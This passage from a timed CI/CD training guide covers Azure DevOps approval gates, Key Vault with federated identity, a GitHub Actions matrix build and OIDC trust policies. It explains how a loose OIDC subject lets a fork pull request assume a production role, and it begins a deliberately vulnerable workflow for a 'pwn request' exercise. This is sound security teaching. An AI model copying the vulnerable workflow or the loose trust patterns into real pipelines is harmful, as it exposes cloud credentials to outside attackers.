⏭ **If H2 overruns:** skip the `Cache@2` task (H3 doesn't need it) and skip `PublishTestResults`. **Never skip the `##vso[task.setvariable …;isOutput=true]` + `$[ stageDependencies… ]` pair** — that's the concept the whole stage model rests on, and it's an interview question.

---

# 🔷 H3 · 07:30–09:00 — CASE 1: stages, environments, approvals, Key Vault

**Deliverable:** dev → staging → production with a human approval gate, and secrets in Key Vault reached via **Workload Identity Federation** — zero stored secrets.

Full detail: [02-CASE-1-azure-devops.md §6–§9](./02-CASE-1-azure-devops.md), plus **Task 1.3**.

```bash
# ── 1. the three environments (10 min) ──────────────────────────
# ⭐⭐ Environments are where the governance lives. Create all three:
#   ADO → Pipelines → Environments → New environment
#     dev        (no checks)
#     staging    (no checks — or a branch control)
#     production (⭐ APPROVALS + branch control + an exclusive lock)
#
# via the REST API so it's reproducible:
for ENV in dev staging production; do
  curl -sf -u ":$(cat ~/.secrets/ado-pat)" -X POST \
    "$ADO_ORG/$ADO_PROJECT/_apis/distributedtask/environments?api-version=7.1" \
    -H 'Content-Type: application/json' \
    -d "{\"name\":\"$ENV\",\"description\":\"the $ENV environment for shop\"}" | jq -r '.name'
done
```

```yaml
# ── 2. ⭐⭐ the deployment job with the approval gate (20 min) ───
# Append to azure-pipelines.yml
  - stage: DeployStaging
    displayName: 🔀 Deploy to staging
    dependsOn: Build
    condition: and(succeeded(), eq(variables['Build.SourceBranchName'], 'main'))
    jobs:
      - deployment: DeployStaging          # ⭐⭐ `deployment:`, NOT `job:`
        displayName: Deploy to staging
        environment: staging               # ⭐ the gates are configured on THIS
        pool: {vmImage: ubuntu-latest}
        variables:
          DIGEST: $[ stageDependencies.Build.outputs['build.imageDigest'] ]
        strategy:
          runOnce:
            preDeploy:
              steps:
                - checkout: self
                - bash: ./scripts/pre-deploy-checks.sh staging "$(SERVICE)"
                  displayName: 🩺 Pre-deploy checks
            deploy:
              steps:
                - bash: ./scripts/deploy.sh staging "$(SERVICE)" "$(REGISTRY)/$(SERVICE)@$(DIGEST)"
                  displayName: 🚀 Deploy
            routeTraffic:
              steps:
                - bash: ./scripts/smoke-test.sh staging "$(SERVICE)"
                  displayName: 🔥 Smoke test
            postRouteTraffic:
              steps:
                - bash: |
                    set -euo pipefail
                    echo "  ⏳ soaking staging for 10 minutes"
                    ./scripts/analyse-canary.sh staging "$(SERVICE)" 600
                  displayName: 🧪 Soak and analyse
            on:
              failure:
                steps:
                  - bash: ./scripts/rollback.sh staging "$(SERVICE)"
                    displayName: ⏪ Automatic rollback
                  - bash: ./scripts/notify.sh failure staging "$(SERVICE)" "$(Build.BuildId)"
              success:
                steps:
                  - bash: ./scripts/emit-pipeline-metrics.sh azure-devops "$(Build.BuildId)"
                    displayName: 📊 Emit the DORA metrics

  - stage: DeployProduction
    displayName: 🚀 Deploy to PRODUCTION
    dependsOn: DeployStaging
    # ⭐⭐ THREE conditions: the previous stage succeeded, we're on main,
    #    AND the gate script passes. The gate runs BEFORE the approval prompt,
    #    so a human is never asked to approve something that can't succeed.
    condition: and(succeeded(), eq(variables['Build.SourceBranchName'], 'main'))
    jobs:
      - deployment: DeployProduction
        displayName: 🚀 Deploy to production
        environment:
          name: production
          resourceName: shop-api
        pool: {vmImage: ubuntu-latest}
        timeoutInMinutes: 120
        variables:
          DIGEST: $[ stageDependencies.Build.outputs['build.imageDigest'] ]
        strategy:
          runOnce:
            preDeploy:
              steps:
                - checkout: self
                - bash: |
                    set -euo pipefail
                    ./scripts/production-gate.sh || {
                      echo "##vso[task.logissue type=error]the production gate refused the deploy"
                      exit 1; }
                  displayName: 🚦 The production gate
            deploy:
              steps:
                - bash: ./scripts/deploy.sh production "$(SERVICE)" "$(REGISTRY)/$(SERVICE)@$(DIGEST)"
                  displayName: 🚀 Deploy
            routeTraffic:
              steps:
                - bash: ./scripts/smoke-test.sh production "$(SERVICE)"
            on:
              failure:
                steps:
                  - bash: ./scripts/rollback.sh production "$(SERVICE)"
                  - bash: ./scripts/incident-report.sh production "$(SERVICE)" "$(Build.BuildId)"
```

```bash
# ── 3. ⭐⭐ the environment checks — configure these in the UI (12 min) ─
# ADO → Pipelines → Environments → production → ⋯ → "Approvals and checks"
#
#   ✅ APPROVALS
#        Required reviewers: <you> + a second identity (so you can test the flow)
#        ⭐ "Requestor cannot approve their own run": ON
#        Instructions for reviewers: paste the checklist from Case 1 §7.2
#        Timeout: 30 days  ⭐ after this the run is REJECTED, not silently dropped
#
#   ✅ BRANCH CONTROL
#        Allowed branches: main, release/*
#        ⭐ "Allow deployments from forks": OFF
#
#   ✅ EXCLUSIVE LOCK                          ⭐⭐ only one deploy at a time
#
#   ⏭ QUERY AZURE MONITOR ALERTS               (skip today — no Azure Monitor)
#        ⭐ but KNOW IT EXISTS: this is an automated SLO gate, and it is the
#           cleanest production gate any of the three tools offers.
#
# ⭐ verify from the API:
curl -sf -u ":$(cat ~/.secrets/ado-pat)" \
  "$ADO_ORG/$ADO_PROJECT/_apis/distributedtask/environments?api-version=7.1" \
  | jq '.value[] | {name, id}'
ENV_ID=$(curl -sf -u ":$(cat ~/.secrets/ado-pat)" \
  "$ADO_ORG/$ADO_PROJECT/_apis/distributedtask/environments?api-version=7.1" \
  | jq -r '.value[] | select(.name=="production") | .id')
curl -sf -u ":$(cat ~/.secrets/ado-pat)" \
  "$ADO_ORG/$ADO_PROJECT/_apis/distributedtask/environments/$ENV_ID/deploymentgrouppolicies?api-version=7.1" \
  | jq '.value[] | {type: .type, enabled: .properties.enabled}'
#   {"type":"taskGate","enabled":true}          ← approvals
#   {"type":"branchControl","enabled":true}
#   {"type":"exclusiveLock","enabled":true}
```

```bash
# ── 4. ⭐⭐⭐ Key Vault + Workload Identity Federation (25 min) ──
# THE GOAL: no secret stored in Azure DevOps at all.
# Copy the full walkthrough from Case 1 §8 and Task 1.3.
az group create -n shop-rg -l westeurope
az keyvault create -n shop-kv-$RANDOM_SUFFIX -g shop-rg -l westeurope \
  --enable-rbac-authorization true
KV=shop-kv-XXXX
az keyvault secret set --vault-name "$KV" --name ghcr-token --value "$(cat ~/.secrets/gh-pat)"
az keyvault secret set --vault-name "$KV" --name db-password --value 'sup3r-s3cret'

# ⭐ the WIF service connection — NO client secret:
az devops service-endpoint azurerm create --name shop-wif \
  --azure-subscription "My Subscription" \
  --subscription-id "$(az account show --query id -o tsv)" \
  --tenant-id "$(az account show --query tenantId -o tsv)" \
  --service-principal-id "$(az ad sp list --display-name shop-ado --query '[0].appId' -o tsv)" \
  --service-connection-type "WorkloadIdentityFederation" \
  --allow-unencrypted-certs true
SP_ID=$(az devops service-endpoint show --id "$SC_ID" --query "authorization.parameters.serviceprincipalid" -o tsv)
az keyvault role assignment create --vault-name "$KV" --role-name "Key Vault Secrets User" \
  --assignee-object-id "$(az ad sp show --id "$SP_ID" --query id -o tsv)" --assignee-principal-type ServicePrincipal

# ⭐ the variable group linked to the vault — every secret becomes a variable:
az pipelines variable-group create --name shop-keyvault --vault-name "$KV" \
  --secrets ghcr-token db-password --authorize true

# ⭐⭐ and the WIF subject you condition the trust on:
#    <orgId>/<projectId>/<environmentName>
#    → so a token minted for the `production` environment cannot be used by a
#      job that didn't declare `environment: production`.
echo "  ⭐ THE PROOF: grep every secret in the project and find zero stored values"
az pipelines variable-group list -o table
az pipelines variable-group variable list --id "$VG_ID" -o json | jq '.[].isSecret'
```

```bash
# ── 5. run it end to end and approve (8 min) ────────────────────
az pipelines run --id "$PIPE_ID" --branch main --open
# → Build ✅ → DeployDev ✅ → DeployStaging ✅ → DeployProduction ⏸ WAITING
# ⭐ go approve it. Read the checklist you pasted. Then approve.
# ⭐⭐ then RE-RUN and let the approval TIMEOUT (set it to 1 minute for the test)
#    and confirm the run is REJECTED and NOTHING deployed:
az pipelines list-runs --id "$PIPE_ID" --top 2 \
  --query '[].{id:id,result:result,state:state}' -o table
kubectl -n shop get rollout shop-api -o jsonpath='{.spec.template.spec.containers[0].image}'; echo
# ⭐ the image digest must be UNCHANGED after the timeout. That's the proof.
```

```bash
# ✅ VERIFY — the H3 checkpoint
#   three environments exist                                       ✅
#   production has approvals + branch control + exclusive lock      ✅
#   a run paused at the production approval                         ✅
#   approving it deployed; timing out did NOT                       ✅
#   ⭐ zero secrets stored in Azure DevOps (all in Key Vault)        ✅
#   ⭐ the WIF service connection has no client secret               ✅
az devops service-endpoint show --id "$SC_ID" \
  --query 'authorization.scheme' -o tsv                              # WorkloadIdentityFederation ✅
```

⏭ **If H3 overruns:** skip the Azure Key Vault half and keep the variable group (note it as a debt — Task 1.3 is exactly this). **Never skip the approval gate + the timeout proof.** That's the single most-asked Azure DevOps interview topic.

---

## ☕ 09:00–09:30 — Breakfast

Do not skip. Your brain consolidates the `$[ stageDependencies… ]` syntax while you eat, and you'll need it in H9.

---

# 🐙 H4 · 09:30–11:00 — CASE 2: GitHub Actions, the first workflow

**Deliverable:** a change-aware, cached, matrix build that tests all five services, builds only the ones that changed, and deploys to dev.

Full detail: [03-CASE-2-github-actions.md §1–§6](./03-CASE-2-github-actions.md), plus **Task 2.1** and **Task 2.4**.

```bash
# ── 1. the repo and the auth (5 min) ────────────────────────────
cd ~/cicd-day
gh auth status
gh repo create shop --private --source=. --remote=origin --push 2>/dev/null \
  || { git remote add origin "https://github.com/3558Bhk/shop.git" 2>/dev/null; }
git remote -v
mkdir -p .github/workflows .github/actions/setup-shop ci
```

```yaml
# ── 2. ⭐⭐ .github/workflows/ci.yml (30 min) ─────────────────────
# THE FILE THAT TEACHES THE MOST. Copy the full version from Case 2 §2–§4.
name: CI
on:
  push: {branches: [main], paths: ['apps/**', 'scripts/**', 'ci/**', '.github/**']}
  pull_request:
    branches: [main]
    paths: ['apps/**', 'scripts/**', 'ci/**', '.github/**']
    types: [opened, synchronize, reopened]     # ⭐ NOT the default set — be explicit

# ⭐⭐ LEAST PRIVILEGE, ALWAYS. This block is the difference between a
#    pipeline and an incident.
permissions:
  contents: read
  packages: write
  id-token: write              # ⭐⭐ REQUIRED for OIDC (cosign keyless + cloud)
  pull-requests: write         # to post the coverage comment
  checks: write                # to publish test results as checks

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  # ⭐ cancel only PR builds. Never cancel a main build mid-deploy.
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  REGISTRY: ghcr.io/3558bhk

jobs:
  # ══════════════════════════════════════════════════════════════
  # JOB 1 — ⭐⭐ the change detector. This is Task 2.1.
  # ══════════════════════════════════════════════════════════════
  changes:
    name: 🔍 What changed?
    runs-on: ubuntu-latest
    timeout-minutes: 5
    permissions: {contents: read, pull-requests: read}
    outputs:
      matrix: ${{ steps.matrix.outputs.matrix }}
      any:    ${{ steps.matrix.outputs.any }}
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b   # v7.0.0 ⭐ SHA-pinned
        with:
          # ⭐⭐ fetch-depth 0 for a PR: paths-filter needs the merge base
          fetch-depth: 0
      - uses: dorny/paths-filter@4512585405083f25c027a35db413c2b3b9006d50   # v3.0.1
        id: filter
        with:
          # ⭐ on `push` to main there is no base — filter compares to the
          #    previous commit automatically. On a PR it compares to the base branch.
          filters: |
            shop-api:
              - 'apps/shop-api/**'
              - 'helm/**'
            checkout:
              - 'apps/checkout/**'
            order-worker:
              - 'apps/order-worker/**'
            shop-ui:
              - 'apps/shop-ui/**'
            payment-mock:
              - 'apps/payment-mock/**'
            shared:
              - 'scripts/**'
              - 'ci/**'
              - '.github/**'
      - id: matrix
        run: |
          set -euo pipefail
          # ⭐⭐ if a SHARED file changed, build everything. Otherwise build only
          #    the services whose own directory changed. That's the real logic —
          #    a naive per-service filter rebuilds the world on every README edit
          #    and rebuilds nothing when you change scripts/deploy.sh.
          SERVICES='["shop-api","checkout","order-worker","shop-ui","payment-mock"]'
          if [[ "${{ steps.filter.outputs.shared }}" == "true" ]]; then
            MATRIX="$SERVICES"
            echo "  ⭐ a shared file changed → building all five"
          else
            MATRIX='[]'
            for s in shop-api checkout order-worker shop-ui payment-mock; do
              if [[ "${{ steps.filter.outputs[s] }}" == "true" ]]; then
                MATRIX=$(echo "$MATRIX" | jq --arg s "$s" '. + [$s]')
              fi
            done
          fi
          ANY=$([[ "$MATRIX" != "[]" ]] && echo true || echo false)
          # ⭐⭐ GUARD: an empty matrix fails the job with
          #    "Matrix must define at least one vector". So we set `any` and
          #    the consumers check it.
          echo "matrix=$MATRIX" >> "$GITHUB_OUTPUT"
          echo "any=$ANY"       >> "$GITHUB_OUTPUT"
          echo "  will build: $MATRIX"
          # ⭐ and the summary page, so a reviewer can see the decision
          {
            echo "### 🔍 Changed services"
            echo "| service | changed |"
            echo "|---|---|"
            for s in shop-api checkout order-worker shop-ui payment-mock; do
              echo "| \`$s\` | ${{ steps.filter.outputs[s] }} |"
            done
            echo "| **shared** | ${{ steps.filter.outputs.shared }} |"
            echo
            echo "**Matrix:** \`$MATRIX\`"
          } >> "$GITHUB_STEP_SUMMARY"

  # ══════════════════════════════════════════════════════════════
  # JOB 2 — ⭐ the polyglot matrix. One job definition, five languages.
  # ══════════════════════════════════════════════════════════════
  build:
    name: 🏗️ ${{ matrix.service }}
    needs: changes
    if: needs.changes.outputs.any == 'true'
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write
      id-token: write
    strategy:
      fail-fast: false            # ⭐⭐ ALWAYS false. true kills the siblings on
                                  #    one failure and you lose the other results.
      max-parallel: 4
      matrix:
        service: ${{ fromJSON(needs.changes.outputs.matrix) }}
        include:
          - {service: shop-api,     language: java,   cache: maven}
          - {service: checkout,     language: go,     cache: ''}
          - {service: order-worker, language: python, cache: pip}
          - {service: shop-ui,      language: node,   cache: npm}
          - {service: payment-mock, language: go,     cache: ''}
    outputs:
      # ⭐⭐ a matrix job's outputs are per-leg; the consumer must index them.
      #    The clean pattern is an ARTIFACT per leg (below) + a collecting job.
      digests: ${{ steps.digests.outputs.all }}
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b

      # ⭐ the COMPOSITE action — the reuse unit for a set of steps
      - uses: ./.github/actions/setup-shop
        with:
          language: ${{ matrix.language }}
          service:  ${{ matrix.service }}
          cache:    ${{ matrix.cache }}

      - name: 🔬 Test
        run: ./ci/test-${{ matrix.language }}.sh "${{ matrix.service }}"

      - name: 📤 Test results
        if: always()                       # ⭐ publish even on failure
        uses: actions/upload-artifact@v4
        with:
          name: test-results-${{ matrix.service }}     # ⭐⭐ UNIQUE per leg
          path: |
            **/target/surefire-reports/*.xml
            **/test-results/**/*.xml
            **/coverage/**
          retention-days: 7                # ⭐ not 90 — artifacts cost money
          if-no-files-found: warn

      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        if: github.event_name != 'pull_request'      # ⭐ never push from a PR
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: 📦 Build
        id: build
        uses: docker/build-push-action@v6
        with:
          context: apps/${{ matrix.service }}
          # ⭐⭐ PR builds LOAD (into the local daemon) so you can test the image;
          #    push builds PUSH. Never push an image from a fork PR.
          load: ${{ github.event_name == 'pull_request' }}
          push: ${{ github.event_name != 'pull_request' }}
          tags: |
            ${{ env.REGISTRY }}/${{ matrix.service }}:${{ github.sha }}
            ${{ github.event_name == 'pull_request' && format('{0}/{1}:pr-{2}', env.REGISTRY, matrix.service, github.event.pull_request.number) || '' }}
          # ⭐⭐ the cache scope is PER SERVICE — a shared scope thrashes
          cache-from: type=gha,scope=${{ matrix.service }}
          cache-to:   type=gha,mode=max,scope=${{ matrix.service }}
          provenance: mode=max             # ⭐ SLSA provenance in the image index
          sbom: true                       # ⭐ an SBOM in the image index
          build-args: |
            GIT_COMMIT=${{ github.sha }}
            BUILD_TIME=${{ github.event.head_commit.timestamp }}
          metadata-file: ${{ runner.temp }}/meta-${{ matrix.service }}.json

      - name: 🔏 Sign and attest
        if: github.event_name != 'pull_request'
        env:
          CI_TOOL: github-actions
          GIT_COMMIT: ${{ github.sha }}
          BUILD_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
          # ⭐⭐ the OIDC identity — pin the workflow FILE and the REF
          OIDC_ISSUER: https://token.actions.githubusercontent.com
          OIDC_IDENTITY: ${{ github.server_url }}/${{ github.repository }}/.github/workflows/ci.yml@${{ github.ref }}
        run: |
          set -euo pipefail
          DIGEST=$(jq -r '."containerimage.digest"' "$RUNNER_TEMP/meta-${{ matrix.service }}.json")
          echo "digest=$DIGEST" >> "$GITHUB_OUTPUT"
          ./scripts/sign-and-attest.sh "${{ env.REGISTRY }}/${{ matrix.service }}" "$DIGEST"

      - name: 🛡️ Scan
        if: github.event_name != 'pull_request'
        run: |
          set -euo pipefail
          DIGEST=$(jq -r '."containerimage.digest"' "$RUNNER_TEMP/meta-${{ matrix.service }}.json")
          # ⭐ CRITICAL fails the build; HIGH only warns (or you'll never merge)
          trivy image --exit-code 1 --severity CRITICAL --ignore-unfixed \
            --format table "${{ env.REGISTRY }}/${{ matrix.service }}@$DIGEST"
          trivy image --exit-code 0 --severity HIGH --format sarif \
            --output "$RUNNER_TEMP/trivy-${{ matrix.service }}.sarif" \
            "${{ env.REGISTRY }}/${{ matrix.service }}@$DIGEST" || true
      - name: 📤 SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: ${{ runner.temp }}/trivy-${{ matrix.service }}.sarif
          category: trivy-${{ matrix.service }}

      - name: 📝 The digest
        run: echo "${{ matrix.service }}=$(jq -r '."containerimage.digest"' "$RUNNER_TEMP/meta-${{ matrix.service }}.json")" >> "$GITHUB_STEP_SUMMARY"

  # ══════════════════════════════════════════════════════════════
  # JOB 3 — collect the digests and promote to dev
  # ══════════════════════════════════════════════════════════════
  promote:
    name: 🔀 Promote to dev
    needs: [changes, build]
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b
      # ⭐⭐ a GitHub APP token, scoped to shop-config ONLY. Not the
      #    GITHUB_TOKEN (which can't write to another repo), and not a PAT
      #    (which is a person and will leave the company).
      - uses: actions/create-github-app-token@v1
        id: app-token
        with:
          app-id:          ${{ vars.PROMOTER_APP_ID }}
          private-key:     ${{ secrets.PROMOTER_APP_KEY }}
          owner:           3558Bhk
          repositories:    shop-config
      - name: 🔀 Promote every changed service
        env:
          GH_TOKEN:          ${{ steps.app-token.outputs.token }}
          SHOP_CONFIG_TOKEN: ${{ steps.app-token.outputs.token }}
        run: |
          set -euo pipefail
          for svc in $(echo '${{ needs.changes.outputs.matrix }}' | jq -r '.[]'); do
            DIGEST=$(gh run view "${{ github.run_id }}" \
              --json jobs --jq ".jobs[] | select(.name==\"🏗️ $svc\") | .steps[] | select(.name==\"🔏 Sign and attest\") | .conclusion" >/dev/null && \
              crane digest "$REGISTRY/$svc:${{ github.sha }}")
            echo "==> $svc → dev @ ${DIGEST:0:19}…"
            ./scripts/promote.sh dev "$svc" "$DIGEST" \
              --revision "${{ github.sha }}" \
              --tool github-actions \
              --run "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" \
              --auto-merge
          done
      - name: 📊 Emit the DORA metrics
        if: always()
        env:
          PUSHGATEWAY: ${{ vars.PUSHGATEWAY_URL }}
        run: ./scripts/emit-pipeline-metrics.sh github-actions "$GITHUB_RUN_ID"
```

```yaml
# ── 3. ⭐ the composite action (10 min) ─────────────────────────
# .github/actions/setup-shop/action.yml
name: Set up the shop build
description: Installs the toolchain and cache for one service, in any language
inputs:
  language: {description: 'java | go | python | node', required: true}
  service:  {description: 'the service directory',      required: true}
  cache:    {description: 'maven | pip | npm | empty',  default: ''}
outputs:
  cache-key: {description: 'the cache key used', value: '${{ steps.key.outputs.key }}'}
runs:
  using: composite
  steps:
    - id: key
      shell: bash
      run: |
        echo "key=${{ inputs.language }}-${{ inputs.service }}-${{ hashFiles(format('apps/{0}/**', inputs.service)) }}" >> "$GITHUB_OUTPUT"
    - if: inputs.language == 'java'
      uses: actions/setup-java@v5                 # ⭐ v5
      with:
        distribution: temurin
        java-version: '21'
        cache: maven
    - if: inputs.language == 'go'
      uses: actions/setup-go@v5
      with:
        go-version-file: 'apps/${{ inputs.service }}/go.mod'   # ⭐ from the file, not hardcoded
        cache-dependency-path: 'apps/${{ inputs.service }}/go.sum'
    - if: inputs.language == 'python'
      uses: actions/setup-python@v5
      with:
        python-version: '3.13'
        cache: pip
        cache-dependency-path: 'apps/${{ inputs.service }}/requirements.txt'
    - if: inputs.language == 'node'
      uses: actions/setup-node@v4
      with:
        node-version: '22'
        cache: npm
        cache-dependency-path: 'apps/${{ inputs.service }}/package-lock.json'
    - shell: bash
      run: echo "✅ set up ${{ inputs.language }} for ${{ inputs.service }} (key ${{ steps.key.outputs.key }})"
```

```bash
# ── 4. ⭐⭐ lint before you push — this saves 30 minutes (5 min) ─
actionlint .github/workflows/ci.yml
# ⭐ actionlint catches: unknown fields, the shellcheck problems inside `run:`,
#    the expression syntax errors, the needs cycle, and the context misuse.
# ⭐⭐ and it runs shellcheck on your `run:` blocks, which catches the
#    script-injection class of bugs before they ship.
shellcheck -x ci/*.sh scripts/*.sh
yamllint .github/workflows/
python3 -c "
import yaml,glob,sys
for f in glob.glob('.github/workflows/*.yml'):
    d=yaml.safe_load(open(f))
    # ⭐⭐ YAML parses `on:` as the boolean True. This is THE GitHub Actions
    #    YAML gotcha and it breaks every homegrown validator.
    k = True if True in d else 'on'
    print(f'  ✅ {f}: triggers = {list(d[k].keys())}')
    for j,v in d.get('jobs',{}).items():
        assert 'timeout-minutes' in v, f'⛔ job {j} has no timeout-minutes'
        assert 'permissions' in v or 'permissions' in d, f'⚠️ job {j} inherits permissions'
    print(f'     jobs: {list(d[\"jobs\"].keys())}')
"
git add -A && git commit -m "ci: the change-aware polyglot matrix build" && git push
```

```bash
# ── 5. watch it (10 min) ────────────────────────────────────────
gh run list --workflow ci.yml --limit 3
gh run watch --exit-status --interval 10
gh run view --log-failed | head -80             # ⭐⭐ only the failures
gh run view --web

# ⭐ the per-step timing — where your minutes actually go
RID=$(gh run list --workflow ci.yml --limit 1 --json databaseId -q '.[0].databaseId')
gh api "repos/3558Bhk/shop/actions/runs/$RID/timing" --jq '{billable, run_duration_ms}'
gh api "repos/3558Bhk/shop/actions/runs/$RID/jobs" --jq '.jobs[] | {name, started_at, completed_at,
  steps: [.steps[] | {name, conclusion,
    secs: ((.completed_at|fromdate) - (.started_at|fromdate))}]}'
```

```bash
# ✅ VERIFY — the H4 checkpoint
gh run list --workflow ci.yml --limit 1 --json conclusion -q '.[0].conclusion'   # success ✅
# ⭐⭐ the change-aware proof: touch ONLY a docs file and confirm NOTHING builds
echo "# a note" >> README.md && git commit -am "docs: a note" && git push
sleep 60
gh run view --json jobs --jq '.jobs[].name'
#   🔍 What changed?          ✅
#   (no 🏗️ jobs at all)       ✅ ← THE MATRIX WAS EMPTY AND THE BUILD SKIPPED
# ⭐ and the reverse: touch scripts/deploy.sh and confirm ALL FIVE build
echo "# a comment" >> scripts/deploy.sh && git commit -am "chore: touch a shared file" && git push
sleep 180
gh run view --json jobs --jq '.jobs[] | select(.name|startswith("🏗️")) | .name' | wc -l   # 5 ✅
# the cache worked
gh api repos/3558Bhk/shop/actions/caches --jq '.total_count, .actions_caches[].key' | head
```

⏭ **If H4 overruns:** drop the SARIF upload and the composite action (inline the setup steps). **Never drop `permissions:`, the SHA-pinned `actions/checkout`, `fail-fast: false`, or the change-aware matrix** — those four are the interview content.

---

# 🐙 H5 · 11:00–12:30 — CASE 2: OIDC, environments, reusable workflows, and the attacks

**Deliverable:** OIDC to a cloud with the narrowest possible `sub`; a protected `production` environment; a SHA-pinned reusable workflow; and the pwn-request attack reproduced and defeated.

Full detail: [03-CASE-2-github-actions.md §7–§11](./03-CASE-2-github-actions.md), plus **Tasks 2.2, 2.3, 2.5**.

```bash
# ── 1. ⭐⭐⭐ OIDC — Task 2.2 (25 min) ───────────────────────────
# THE EXERCISE: mint a token and DECODE IT, so you can see the claims yourself.
cat > .github/workflows/oidc-probe.yml <<'EOF'
name: OIDC probe
on: workflow_dispatch
permissions:
  id-token: write          # ⭐⭐ WITHOUT THIS: "Error: Process completed: getOIDCToken: 403"
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    environment: production    # ⭐ so the `sub` carries the environment
    steps:
      - name: ⭐ decode my own token
        run: |
          set -euo pipefail
          # the token is available to the cloud actions; to see it raw, use the
          # ACTIONS_ID_TOKEN_REQUEST_URL API directly:
          TOKEN=$(curl -sfL -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sigstore" | jq -r .value)
          echo "  ── the claims ──"
          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{
            iss, sub, aud, ref, sha, repository, repository_owner,
            environment, event_name, job_workflow_ref, run_id, run_attempt,
            workflow, actor, base_ref, head_ref, environment_node_id
          }'
          # ⭐⭐ THE `sub` YOU CONDITION ON:
          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '"\n  sub = \(.sub)"'
EOF
git add -A && git commit -m "ci: the OIDC probe" && git push
gh workflow run oidc-probe.yml && sleep 45
gh run list --workflow oidc-probe.yml --limit 1 --json databaseId -q '.[0].databaseId' | xargs -I{} gh run view {} --log | grep -A20 'the claims'
```

```
  ── the claims ──
  {
    "iss": "https://token.actions.githubusercontent.com",
    "sub": "repo:3558Bhk/shop:environment:production",     ← ⭐⭐⭐ THE ONE YOU CONDITION ON
    "aud": "sigstore",
    "ref": "refs/heads/main",
    "sha": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
    "repository": "3558Bhk/shop",
    "repository_owner": "3558Bhk",
    "repository_owner_id": "12345678",
    "environment": "production",
    "event_name": "workflow_dispatch",
    "job_workflow_ref": "3558Bhk/shop/.github/workflows/oidc-probe.yml@refs/heads/main",
    "run_id": "1234567890",
    "run_attempt": "1",
    "workflow": "OIDC probe",
    "actor": "3558Bhk",
    "base_ref": "",
    "head_ref": ""
  }

⭐⭐ THE SIX `sub` SHAPES, NARROWEST → WIDEST — and what each one lets in:

  1. repo:3558Bhk/shop:pull_request                        ⛔⛔ ANY fork PR. Never.
  2. repo:3558Bhk/shop:ref:refs/heads/feature/x            a single branch
  3. repo:3558Bhk/shop:environment:production              ⭐ an environment
  4. repo:3558Bhk/shop:ref:refs/heads/main:environment:production   ⭐⭐⭐ BOTH
  5. repo:3558Bhk/shop:*                                   ⛔ any run in the repo
  6. repo:3558Bhk/*                                        ⛔⛔ any repo you own

⭐ THE PROOF THAT #1 IS CATASTROPHIC: a fork PR's `sub` is
   `repo:3558Bhk/shop:pull_request` — so a trust policy on `repo:3558Bhk/shop:*`
   (#5) accepts it. An attacker opens a PR from their fork, your workflow runs,
   and it can assume your production role. That is not theoretical.
⭐ THE FIX: condition on #4. Then the token only exists for a job that declares
   `environment: production`, which is gated by required reviewers. So
   "who can assume the role" becomes "who can approve a production deployment".
```

```bash
# ── 2. the trust policies (15 min) ──────────────────────────────
# ⭐ AWS:
cat > trust-policy.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:3558Bhk/shop:ref:refs/heads/main:environment:production"
      }
    }
  }]
}
EOF
aws iam create-role --role-name github-shop-deploy --assume-role-policy-document file://trust-policy.json
aws iam attach-role-policy --role-name github-shop-deploy \
  --policy-arn arn:aws:iam::123456789012:policy/shop-deploy-least-privilege
# ⭐⭐ AND THE ROLE POLICY IS ALSO SCOPED — the OIDC condition is only half of it:
cat > role-policy.json <<'EOF'
{"Version":"2012-10-17","Statement":[
  {"Effect":"Allow","Action":["ecr:GetAuthorizationToken"],"Resource":"*"},
  {"Effect":"Allow","Action":["ecr:BatchCheckLayerAvailability","ecr:PutImage","ecr:InitiateLayerUpload",
    "ecr:UploadLayerPart","ecr:CompleteLayerUpload","ecr:BatchGetImage"],
   "Resource":"arn:aws:ecr:eu-west-1:123456789012:repository/shop/*"}
]}
EOF
# ⭐ and the debug command when it fails:
aws sts decode-authorization-message --encoded-message "$MSG" --query DecodedMessage --output text | jq

# ⭐ Azure (the federated credential):
az identity federated-credential create --name gha-shop-production \
  --identity-name shop-identity --resource-group shop-rg \
  --issuer https://token.actions.githubusercontent.com \
  --subject "repo:3558Bhk/shop:ref:refs/heads/main:environment:production" \
  --audiences api://AzureADTokenExchange

# ⭐ GCP (the attribute condition):
gcloud iam workload-identity-pools providers create-oidc gha \
  --location=global --workload-identity-pool=shop-pool \
  --issuer-uri=https://token.actions.githubusercontent.com \
  --attribute-mapping="google.subject=assertion.sub,attribute.repo=assertion.repository,attribute.ref=assertion.ref" \
  --attribute-condition="assertion.repository == '3558Bhk/shop' && assertion.ref == 'refs/heads/main'"
```

```bash
# ── 3. ⭐⭐⭐ THE PWN REQUEST — reproduce it, then defeat it (20 min) ─
# Task 2.3. This is the exercise that makes you employable.
cat > .github/workflows/VULNERABLE.yml <<'EOF'
# ⛔⛔ DELIBERATELY VULNERABLE — for the exercise only. DELETE IT AFTER.
name: ⛔ VULNERABLE DO NOT USE
